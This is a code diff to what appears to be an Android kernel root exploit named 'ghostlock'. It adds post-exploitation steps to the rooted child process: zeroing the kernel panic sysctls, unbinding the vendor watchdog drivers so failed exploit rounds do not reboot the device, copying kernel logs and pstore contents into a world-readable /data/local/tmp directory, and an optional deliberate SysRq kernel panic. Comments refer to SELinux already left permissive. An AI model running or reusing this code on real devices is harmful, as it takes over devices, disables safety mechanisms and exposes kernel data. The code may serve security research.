@@ -9,7 +9,15 @@
 #include "attack/ops.hpp"
 #include "support/native_resource.hpp"
 
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
 #include <array>
+#include <cstring>
+#include <ctime>
+#include <dirent.h>
 
 namespace ghostlock::session::victim {
     /* rooted exits kfree the static init_cred (w2 stores it with no
@@ -21,6 +29,362 @@ namespace ghostlock::session::victim {
             (void) write(adj.get(), value, sizeof(value) - 1);
         }
         for (;;) pause();
+    }
+
+    /* Rooted child zeroes the panic-trigger sysctls: after the first rooted
+     * round, a missed round in the same boot degrades to a logged oops instead
+     * of a reboot. uid=0 + init_cred passes the root-owned sysctl mode check;
+     * W1 already left SELinux permissive; the app seccomp filter restricts
+     * syscall numbers, not paths -- openat/write on /proc are already proven
+     * by oom_score_adj. Failures are logged, non-fatal. */
+    static void suppress_panic_reboot(void) {
+        static const char *const kPanicSysctls[] = {
+                "/proc/sys/kernel/panic_on_oops",
+                "/proc/sys/kernel/panic_on_rcu_stall",
+        };
+        for (const char *path : kPanicSysctls) {
+            support::UniqueFd fd(open(path, O_WRONLY | O_CLOEXEC));
+            if (!fd.valid()) {
+                pr_warning("panic-suppress open failed path=%s errno=%d\n", path, errno);
+                continue;
+            }
+            errno = 0;
+            static const char kZero[] = "0";
+            const ssize_t nw = write(fd.get(), kZero, sizeof(kZero) - 1);
+            if (nw != 1) {
+                pr_warning("panic-suppress write failed path=%s errno=%d\n", path, errno);
+                continue;
+            }
+            /* Read back: one silent non-stick write already happened (the
+             * fork-hold holder's oom_score_adj), so log the effective value. */
+            support::UniqueFd rd(open(path, O_RDONLY | O_CLOEXEC));
+            char value[8] = {};
+            const ssize_t nr = rd.valid() ? read(rd.get(), value, sizeof(value) - 1) : -1;
+            if (nr > 0) {
+                size_t vlen = static_cast < size_t > (nr);
+                while (vlen > 0 && value[vlen - 1] == '\n') vlen--;
+                value[vlen] = '\0';
+                pr_info("panic-suppress ok path=%s value=%s\n", path, value);
+            } else {
+                pr_info("panic-suppress ok path=%s (readback failed errno=%d)\n", path, errno);
+            }
+        }
+    }
+
+    /* Write a short NUL-free string to a sysfs attribute; returns bytes or -1. */
+    static ssize_t write_name_to(const char *path, const char *name) {
+        support::UniqueFd fd(open(path, O_WRONLY | O_CLOEXEC));
+        if (!fd.valid()) return -1;
+        return write(fd.get(), name, strlen(name));
+    }
+
+    /* Rooted child disarms the marble vendor reboot chain without
+     * delete_module: the miss round dies through qcom_soc_wdt (20s bark ->
+     * bite) + gh_virt_wdt, never through panic() (PANIC_TIMEOUT=-1, pstore
+     * stays empty, bootreason=reboot). The direct rmmod proved deadly on
+     * device (k round-23): the rooted child itself is a descendant of
+     * app zygote -> holds module refcounts via MM, so delete_module went to
+     * sleep in the kernel waiting for our OWN refcount to drop and the
+     * child hung forever in D state (no wdt-off line, no root worker
+     * spawn). Instead stop the petting thread: qcom_soc_wdt registers a
+     * platform driver whose probe owns the msm-watchdog; unbinding it
+     * (echo > driver unbind) runs qcom_wdt_remove through the driver core
+     * in the caller's context -- no refcount wait, no sleep on ourselves.
+     * uid=0 + init_cred passes the write permission check; W1 already left
+     * SELinux permissive. Failures are logged, non-fatal. */
+    static void disable_watchdog_modules(void) {
+        static const char *const kWatchdogBindPaths[] = {
+                /* gh-watchdog driver dir holds a live symlinked device
+                 * (hypervisor:qcom,gh-watchdog, verified on device); unbind
+                 * runs the driver remove path in the caller's context. */
+                "/sys/bus/platform/drivers/gh-watchdog/unbind",
+                /* msm_watchdog driver dir exists but had NO bound device on
+                 * device (soc wdt binds via qcom_soc_wdt.ko with its own
+                 * device name); kept as best-effort second path. */
+                "/sys/bus/platform/drivers/msm_watchdog/unbind",
+        };
+        for (const char *path : kWatchdogBindPaths) {
+            errno = 0;
+            const ssize_t nw = write_name_to(path, "hypervisor:qcom,gh-watchdog");
+            if (nw < 0) {
+                pr_info("wdt-off unbind miss path=%s errno=%d\n", path, errno);
+                continue;
+            }
+            pr_info("wdt-off unbind ok path=%s\n", path);
+            return;
+        }
+    }
+
+    /* Evidence directory. The app files dir is the natural home, but anything
+     * written there by this uid=0 task is root:root 0600, which adb shell and
+     * run-as both read as EACCES - one hit's 256 KiB kmsg snapshot was already
+     * lost that way. /data/local/tmp survives reboots, and a 0777 subdir under
+     * its 0771 shell:shell parent stays readable for adb shell long after the
+     * app process is gone, so the record is always pullable. */
+    static const char *const kForensicsDir = "/data/local/tmp/glkfx";
+
+    static bool forensics_dir(char *buf, size_t n) {
+        snprintf(buf, n, "%s", kForensicsDir);
+        const int made = mkdir(buf, 0777);
+        /* Snapshot mkdir's errno before chmod runs: chmod is a real syscall and
+         * overwrites errno on failure, which would otherwise turn a genuine
+         * failure into a bogus EEXIST match. */
+        const int made_errno = (made == 0) ? 0 : errno;
+        /* The inherited umask strips the group/other bits, which leaves the
+         * directory unsearchable for adb shell (EACCES on every path inside,
+         * even for 0644 files). Force the mode: this task is uid=0 here, and a
+         * 0700 evidence dir hides exactly the record we are trying to keep. */
+        (void) chmod(buf, 0777);
+        if (made == 0 || made_errno == EEXIST) return true;
+        /* Fall back to the app files dir (the root script's dirname). */
+        snprintf(buf, n, "%s", config::runtime_config_snapshot().root_script_path.c_str());
+        char *slash = strrchr(buf, '/');
+        if (slash == nullptr) return false;
+        *slash = '\0'; /* .../files (root script lives directly in app files/) */
+        return true;
+    }
+
+    static void copy_forensics_file(const char *dir, const char *src, const char *tag) {
+        support::UniqueFd in(open(src, O_RDONLY | O_CLOEXEC));
+        if (!in.valid()) {
+            pr_warning("forensics miss src=%s errno=%d\n", src, errno);
+            return;
+        }
+        std::array < char, 512 > dst{};
+        snprintf(dst.data(), dst.size(), "%s/%s", dir, tag);
+        support::UniqueFd out(
+                open(dst.data(), O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644));
+        if (!out.valid()) {
+            pr_warning("forensics create failed dst=%s errno=%d\n", dst.data(), errno);
+            return;
+        }
+        /* The app runs with umask 0077, which strips the group/other bits from
+         * the open() mode: force the mode after the fact so adb shell (uid
+         * 2000) can read the snapshot without root. */
+        (void) fchmod(out.get(), 0644);
+        std::array < char, 4096 > buf{};
+        ssize_t total = 0;
+        ssize_t nr;
+        while ((nr = read(in.get(), buf.data(), buf.size())) > 0) {
+            ssize_t off = 0;
+            while (off < nr) {
+                const ssize_t nw = write(out.get(), buf.data() + off, static_cast < size_t > (nr - off));
+                if (nw <= 0) break;
+                off += nw;
+            }
+            total += nr;
+        }
+        fsync(out.get()); /* the machine can die right after this returns */
+        pr_info("forensics ok src=%s dst=%s bytes=%zd\n", src, dst.data(), total);
+    }
+
+    /* Head of THIS boot's printk ring (ramoops probe results, pstore/ramoops
+     * registration messages, console setup) - the first 256 KiB answer "did
+     * ramoops register at all". /dev/kmsg is root-only; uid=0 reads it with
+     * O_NONBLOCK so the drain stops at EAGAIN instead of blocking forever. */
+    static void dump_kmsg_head(const char *dir) {
+        support::UniqueFd in(open("/dev/kmsg", O_RDONLY | O_NONBLOCK | O_CLOEXEC));
+        if (!in.valid()) {
+            pr_warning("kmsg head open failed errno=%d\n", errno);
+            return;
+        }
+        std::array < char, 512 > dst{};
+        snprintf(dst.data(), dst.size(), "%s/kmsg-head.bin", dir);
+        support::UniqueFd out(
+                open(dst.data(), O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644));
+        if (!out.valid()) {
+            pr_warning("kmsg head create failed dst=%s errno=%d\n", dst.data(), errno);
+            return;
+        }
+        (void) fchmod(out.get(), 0644); /* umask 0077 would hide it from adb shell */
+        ssize_t total = 0;
+        while (total < 262144) {
+            char rec[4096];
+            const ssize_t nr = read(in.get(), rec, sizeof(rec));
+            if (nr <= 0) break; /* EAGAIN = ring drained from the start */
+            const ssize_t nw = write(out.get(), rec, static_cast < size_t > (nr));
+            if (nw <= 0) break;
+            total += nw;
+        }
+        fsync(out.get());
+        pr_info("kmsg head ok dst=%s bytes=%zd\n", dst.data(), total);
+    }
+
+    /* Continuous kernel-log recorder. A miss-round death leaves no pstore
+     * entry (ramoops never registers on this device), so the kernel's own
+     * account of the wedge exists only in the printk ring of the boot that
+     * dies. This detached fork keeps draining /dev/kmsg into a world-readable
+     * file and fsyncs it once a second, so the record outlives the abrupt
+     * reboot and can be pulled afterwards. */
+    static void start_kmsg_tailer(const char *dir) {
+        const pid_t tail = fork();
+        if (tail < 0) {
+            pr_warning("kmsg tail: fork failed errno=%d\n", errno);
+            return;
+        }
+        if (tail > 0) {
+            pr_info("kmsg tail: recorder pid=%d\n", tail);
+            return;
+        }
+        setsid();
+        /* Do NOT inherit the run's descriptors: the reclaim sockets and the
+         * handoff pipes must stay owned by the exiting parent, not by a
+         * long-lived child. */
+        int32_t fd_limit = 1024;
+        struct rlimit nofile_limit{};
+        if (getrlimit(RLIMIT_NOFILE, &nofile_limit) == 0 &&
+            nofile_limit.rlim_cur != RLIM_INFINITY &&
+            nofile_limit.rlim_cur <= static_cast<rlim_t>(1048576)) {
+            fd_limit = static_cast<int32_t>(nofile_limit.rlim_cur);
+        }
+        for (int32_t fd = 3; fd < fd_limit; fd++) close(fd);
+        std::array < char, 512 > path{};
+        snprintf(path.data(), path.size(), "%s/kmsg-tail.bin", dir);
+        support::UniqueFd in(open("/dev/kmsg", O_RDONLY | O_CLOEXEC));
+        support::UniqueFd out(
+                open(path.data(), O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644));
+        if (!in.valid() || !out.valid()) _exit(1);
+        (void) fchmod(out.get(), 0644); /* umask 0077 would hide the tail from adb shell */
+        std::array < char, 128 > hdr{};
+        const int hn =
+                snprintf(hdr.data(), hdr.size(), "\n=== glk kmsg tail start pid=%d ===\n", getpid());
+        if (hn > 0) {
+            const ssize_t nw = write(out.get(), hdr.data(), static_cast < size_t > (hn));
+            (void) nw;
+            fsync(out.get());
+        }
+        std::array < char, 8192 > rec{};
+        time_t last_sync = time(nullptr);
+        for (;;) {
+            const ssize_t nr = read(in.get(), rec.data(), rec.size());
+            if (nr > 0) {
+                ssize_t off = 0;
+                while (off < nr) {
+                    const ssize_t nw = write(out.get(), rec.data() + off,
+                                             static_cast < size_t > (nr - off));
+                    if (nw <= 0) break;
+                    off += nw;
+                }
+            } else if (nr < 0 && errno != EAGAIN && errno != EINTR) {
+                fsync(out.get()); /* device node gone: the machine is going down */
+                _exit(1);
+            }
+            const time_t now = time(nullptr);
+            if (now != last_sync) {
+                fsync(out.get());
+                last_sync = now;
+            }
+        }
+    }
+
+    /* One-shot calibration experiment: shell never sees a pstore entry after
+     * a real miss-round death, yet the DT carries a ramoops reservation. Fire
+     * a deliberate SysRq 'c' panic 40 s after the first rooted task of this
+     * boot, from a detached fork. If ramoops is registered, the next boot then
+     * has console-ramoops-0 with "sysrq triggered crash" at the tail - which
+     * proves the channel and gives the reference shape. If it is still empty,
+     * this device's ramoops never registers and pstore is a dead end. The
+     * marker file makes it one-shot per install (app data survives reboots);
+     * delete files/.pstore-calib-done via run-as to re-arm. */
+    static void arm_pstore_calibration_probe(const char *dir) {
+        /* Opt-in only. This probe deliberately panics the kernel 40 s after a
+         * hit, which once invalidated a hit round's own verification (m/round-11:
+         * the "wdt-off unbind ok" line was there, then the device went away
+         * before the poll finished). Create <dir>/.pstore-calib-enable via
+         * run-as to arm it. */
+        std::array < char, 512 > enable{};
+        snprintf(enable.data(), enable.size(), "%s/.pstore-calib-enable", dir);
+        if (access(enable.data(), F_OK) != 0) return;
+        std::array < char, 512 > marker{};
+        snprintf(marker.data(), marker.size(), "%s/.pstore-calib-done", dir);
+        support::UniqueFd mk(
+                open(marker.data(), O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600));
+        if (!mk.valid()) {
+            if (errno == EEXIST) pr_info("calib: marker exists, probe already armed/fired\n");
+            else pr_warning("calib: marker create failed errno=%d\n", errno);
+            return;
+        }
+        const pid_t probe = fork();
+        if (probe < 0) {
+            pr_warning("calib: fork failed errno=%d\n", errno);
+            return;
+        }
+        if (probe == 0) {
+            setsid();
+            sleep(40);
+            const char *setup[] = {"/proc/sys/kernel/panic", "10", "/proc/sys/kernel/sysrq", "1"};
+            for (size_t i = 0; i < 4; i += 2) {
+                support::UniqueFd fd(open(setup[i], O_WRONLY | O_CLOEXEC));
+                if (fd.valid()) {
+                    const ssize_t nw = write(fd.get(), setup[i + 1], strlen(setup[i + 1]));
+                    (void) nw;
+                }
+            }
+            support::UniqueFd trig(open("/proc/sysrq-trigger", O_WRONLY | O_CLOEXEC));
+            if (trig.valid()) {
+                const ssize_t nw = write(trig.get(), "c", 1);
+                (void) nw;
+            }
+            _exit(0); /* unreachable when the trigger works */
+        }
+        pr_info("calib: probe armed pid=%d sysrq panic in 40s\n", probe);
+    }
+
+    /* Forensics: shell cannot read /sys/fs/pstore (root-only), but this task
+     * is uid=0 with full caps. Copy EVERY pstore entry (not just the classic
+     * ramoops names) plus kernel parameters that decide the reboot chain, so
+     * a later reboot cannot lose them. */
+    static void dump_pstore_snapshot(void) {
+        std::array < char, 320 > files_dir{};
+        if (!forensics_dir(files_dir.data(), files_dir.size())) return;
+
+        /* An earlier build put the recorder in /data/local/tmp/glk-forensics and
+         * created it under a umask that left it 0700 root:root, so a whole
+         * boot's kernel record was unreachable for adb shell. This task is uid=0
+         * and can still repair it: widen the old directory and its recorder so
+         * the boot that died can be read after the next reset. */
+        (void) chmod("/data/local/tmp/glk-forensics", 0777);
+        (void) chmod("/data/local/tmp/glk-forensics/kmsg-tail.bin", 0644);
+        (void) chmod("/data/local/tmp/glk-forensics/kmsg-head.bin", 0644);
+
+        static const char *const kParamFiles[] = {
+                "/proc/version",
+                "/proc/cmdline",
+                "/proc/sys/kernel/panic",
+                "/proc/sys/kernel/panic_on_oops",
+                "/proc/sys/kernel/panic_on_rcu_stall",
+                "/proc/sys/kernel/sysrq",
+                "/proc/last_kmsg",
+        };
+        for (const char *src : kParamFiles) {
+            const char *base = strrchr(src, '/');
+            base = (base == nullptr) ? src : base + 1;
+            std::array < char, 96 > tag{};
+            snprintf(tag.data(), tag.size(), "param-%s", base);
+            copy_forensics_file(files_dir.data(), src, tag.data());
+        }
+        start_kmsg_tailer(files_dir.data());
+        dump_kmsg_head(files_dir.data());
+
+        DIR *dir = opendir("/sys/fs/pstore");
+        if (dir == nullptr) {
+            pr_warning("pstore dump: opendir failed errno=%d\n", errno);
+            return;
+        }
+        int dumped = 0;
+        const struct dirent *de;
+        while ((de = readdir(dir)) != nullptr) {
+            if (de->d_name[0] == '.') continue;
+            std::array < char, 512 > dst{};
+            snprintf(dst.data(), dst.size(), "pstore-%s", de->d_name);
+            std::array < char, 512 > src{};
+            snprintf(src.data(), src.size(), "/sys/fs/pstore/%s", de->d_name);
+            copy_forensics_file(files_dir.data(), src.data(), dst.data());
+            dumped++;
+        }
+        closedir(dir);
+        if (dumped == 0) pr_info("pstore dump: no entries (dir empty)\n");
+        arm_pstore_calibration_probe(files_dir.data());
     }
 
     static void child_main(VictimContext &p) {
@@ -117,6 +481,14 @@ namespace ghostlock::session::victim {
             p.uid_write.reset();
             _exit(1);
         }
+        /* First rooted task of this boot: cut the reboot chain before any
+         * later missed round can hit panic_on_oops, and snapshot the previous
+         * boot's panic printk tail from pstore. Run once, before the fd sweep. */
+        suppress_panic_reboot();
+        dump_pstore_snapshot();
+        /* The marble miss round reboots through the vendor watchdog chain,
+         * not panic(); unload it while we hold uid=0. */
+        disable_watchdog_modules();
         /* Don't leak app-side fds into the root shell chain: ksud/zygisk
      * daemons must not keep their write ends open. */
         /* Every live descriptor above stdio must not leak into the exec chain,
